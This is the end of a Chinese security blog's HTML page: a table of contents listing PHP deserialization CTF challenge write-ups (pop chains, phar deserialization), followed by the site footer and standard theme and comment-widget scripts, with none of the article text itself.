href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bno_wakeup"><span class="toc-number">3.2.</span> <span class="toc-text"> [SWPUCTF 2021 新生赛] no_wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C__tostring%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text"> 执行__toString () 魔术方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AA%E6%9C%89%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text"> 多个有类反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop"><span class="toc-number">4.1.</span> <span class="toc-text"> [SWPUCTF 2021 新生赛] pop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swpu-nss%E6%96%B0%E7%94%9F%E8%B5%9B-ez_1zpop"><span class="toc-number">4.2.</span> <span class="toc-text"> [SWPU NSS 新生赛] ez_1zpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#newstar%E6%96%B0%E7%94%9F%E8%B5%9B-unserializeone"><span class="toc-number">4.3.</span> <span class="toc-text"> NewStar 新生赛 UnserializeOne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E4%B8%AAdemo%E9%A2%98%E8%AF%95%E8%AF%95%E6%B0%B4%E4%BB%A5%E5%90%8E%E8%A1%A5%E5%85%85"><span class="toc-number">4.4.</span> <span class="toc-text"> 写个 demo 题试试水 (以后补充)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text"> phar 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day1-web1dropbox"><span class="toc-number">5.1.</span> <span class="toc-text"> [CISCN2019 华北赛区 Day1 Web1] Dropbox</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By 4rozeN</div><div class="footer_custom_text"><span id="performance-info"></span> </div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fa-arrows-alt-h fas"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fa-comments fas"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fa-book-open fas"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fa-cog fa-spin fas"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fa-adjust fas"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fa-arrow-up fas"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(async()=>{window.katex_js_css||(window.katex_js_css=!0,await btf.getCSS("https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"),await btf.getScript("https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js")),document.querySelectorAll("#article-container .katex").forEach(t=>t.classList.add("katex-show"))})();</script><script>(()=>{const o="shuoshuo"===GLOBAL_CONFIG_SITE.pageType,t=null,e=(e=document,n=location.pathname)=>{twikoo.init({el:e.querySelector("#twikoo-wrap"),envId:"https://4rozen-blog.netlify.app/.netlify/functions/twikoo",region:"",onCommentLoaded:()=>{btf.loadLightbox(document.querySelectorAll("#twikoo .tk-content img:not(.tk-owo-emotion)"))},...t,path:n}),o&&(window.shuoshuoComment.destroyTwikoo=()=>{e.children.length&&(e.innerHTML="",e.classList.add("no-comment"))})},n=(o,t)=>{"object"==typeof twikoo?setTimeout(()=>e(o,t),0):btf.getScript("https://registry.npmmirror.com/twikoo/1.6.44/files/dist/twikoo.min.js").then(()=>e(o,t))};o?window.shuoshuoComment={loadComment:n}:n()})();</script></div><script src="/js/rightmenu.js"></script><canvas id="universe"></canvas><script src="/js/ripple-toggle.js"></script><script src="/js/star.js"></script><script src="/js/watch.js"></script><script src="/js/butterfly.js"></script><script id="canvas_nest" defer color="0,0,255" opacity="0.7" zindex="-1" count="99" mobile="false" src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/canvas-nest.js/2.0.4/canvas-nest.js"></script><script src="https://lib.baomitu.com/pjax/0.2.8/pjax.min.js"></script><script>(()=>{window.pjax=new Pjax({elements:'a:not([target="_blank"])',selectors:["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"],cacheBust:!1,analytics:!1,scrollRestoration:!1});const e=e=>{e&&Object.values(e).forEach(e=>e())};document.addEventListener("pjax:send",()=>{btf.removeGlobalFnEvent("pjaxSendOnce"),btf.removeGlobalFnEvent("themeChange");const t=document.body.classList;t.contains("read-mode")&&t.remove("read-mode"),e(window.globalFn.pjaxSend)}),document.addEventListener("pjax:complete",()=>{btf.removeGlobalFnEvent("pjaxCompleteOnce"),document.querySelectorAll("script[data-pjax]").forEach(e=>{const t=document.createElement("script"),n=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach(e=>t.setAttribute(e.name,e.value)),t.appendChild(document.createTextNode(n)),e.parentNode.replaceChild(t,e)}),e(window.globalFn.pjaxComplete)}),document.addEventListener("pjax:error",e=>{if(404===e.request.status){!0?pjax.loadUrl("/404"):window.location.href="/404"}})})();</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fa-times fas"></i></button></nav><div class="text-center" id="loading-database"><i class="fa-pulse fa-spinner fas"></i><span> 数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div> <script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script> <script>const CODE_CONFIG={beautify:!0,highlightCopy:!0,highlightLang:!0,highlightHeightLimit:360,isHighlightShrink:!1,copy:{success:"复制成功",error:"复制失败",noSupport:"浏览器不支持复制功能"}};console.log("%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin","color: #fff; background: #5f5f5f","color: #fff; background: #80c8f8","");</script> </body></html>